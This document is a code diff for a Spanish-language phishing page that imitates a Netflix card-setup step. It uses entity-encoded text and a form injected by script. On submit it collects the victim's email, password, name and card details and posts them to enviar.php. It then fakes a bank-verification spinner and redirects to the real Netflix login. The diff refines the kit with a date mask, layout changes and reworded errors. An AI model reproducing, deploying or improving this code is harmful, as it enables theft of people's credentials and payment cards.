@@ -6,31 +6,28 @@
     <title>C&#111;nfirmaci&#243;n de S&#101;rvici&#111;</title>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    
     <style>
         body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
         .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
         .step { text-transform: uppercase; font-size: 13px; color: #333; }
         h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
-        .payment-icons { margin: 15px 0; display: flex; gap: 8px; }
-        .fa-cc-visa { color: #1A1F71; font-size: 35px; }
-        .fa-cc-mastercard { color: #EB001B; font-size: 35px; }
-        .fa-cc-amex { color: #007BC1; font-size: 35px; }
+        .payment-icons { margin: 15px 0; display: flex; gap: 8px; color: #1A1F71; font-size: 35px; }
         .input-box { position: relative; margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; }
+        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
+        .input-box input:focus { border-color: #0071eb; }
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        #loading-overlay { display: none; text-align: center; padding: 20px; }
+        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        #loading-overlay { display: none; text-align: center; padding: 40px; }
     </style>
 </head>
 <body>
     <nav class="nav-pay">
         <img src="img/logo.png" style="width: 100px;" alt="Service">
-        <a href="#" style="text-decoration: none; color: #333; font-weight: bold;">Cerrar sesión</a>
+        <span style="text-decoration: none; color: #333; font-weight: bold; font-size: 14px; cursor: pointer;">Cerrar sesión</span>
     </nav>
 
-    <div class="container-pay">
+    <div class="container-pay" id="form-container">
         <span class="step">Paso <b>3</b> de <b>3</b></span>
         <h1>Configura tu tarjeta</h1>
         
@@ -41,15 +38,14 @@
         </div>
 
         <div id="dynamic-injection"></div>
+    </div>
 
-        <div id="loading-overlay">
-            <i class="fas fa-spinner fa-spin fa-2x" style="color:#e50914;"></i>
-            <p id="loading-text">Verificando con su entidad bancaria...</p>
-        </div>
+    <div id="loading-overlay">
+        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
+        <p style="margin-top: 20px; font-size: 18px; font-weight: 500;">Validando información con su banco...</p>
     </div>
 
     <script>
-        // 1. INYECCIÓN DEL FORMULARIO AL CARGAR LA PÁGINA
         window.onload = function() {
             document.getElementById('dynamic-injection').innerHTML = `
                 <form id="pay-process-form">
@@ -64,20 +60,23 @@
                 </form>
             `;
             
-            // Una vez inyectado, activamos el escucha del evento submit
+            // Máscara simple para fecha MM/AA
+            document.getElementById('f_e_1').addEventListener('input', function(e) {
+                let v = this.value.replace(/\D/g, '');
+                if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
+            });
+
             _setupForm();
         };
 
         function _setupForm() {
             document.getElementById('pay-process-form').addEventListener('submit', function(e) {
                 e.preventDefault();
-                
-                // Ocultar formulario y mostrar carga
-                document.getElementById('dynamic-injection').style.display = 'none';
+                document.getElementById('form-container').style.display = 'none';
                 document.getElementById('loading-overlay').style.display = 'block';
 
                 const payload = {
-                    em: sessionStorage.getItem('usr_mail') || 'No definido',
+                    em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                     pw: document.getElementById('f_k_1').value,
                     nm: document.getElementById('f_n_1').value,
                     cc: document.getElementById('f_t_1').value,
@@ -89,31 +88,26 @@
             });
         }
 
-        // 2. ENVÍO DE DATOS AL PHP
         function _0xdispatch(obj) {
             fetch('enviar.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(obj)
             })
-            .then(response => {
-                if (!response.ok) throw new Error("Error en red");
-                return response.json();
-            })
+            .then(res => res.json())
             .then(data => {
                 setTimeout(() => {
                     if (data.pago === true) {
                         alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
                         window.location.href = "https://www.netflix.com/login";
                     } else {
-                        // MUESTRA EL ERROR ESPECÍFICO (CVV, Fecha, etc.)
-                        alert("Atención: " + data.mensaje_error);
+                        alert("Atención: " + data.mensaje_error + ". Use una tarjeta válida.");
                         location.reload();
                     }
                 }, 2000);
             })
             .catch(err => {
-                alert("Error de conexión con el servidor. Verifique enviar.php.");
+                alert("Error técnico. Verifique su conexión.");
                 location.reload();
             });
         }
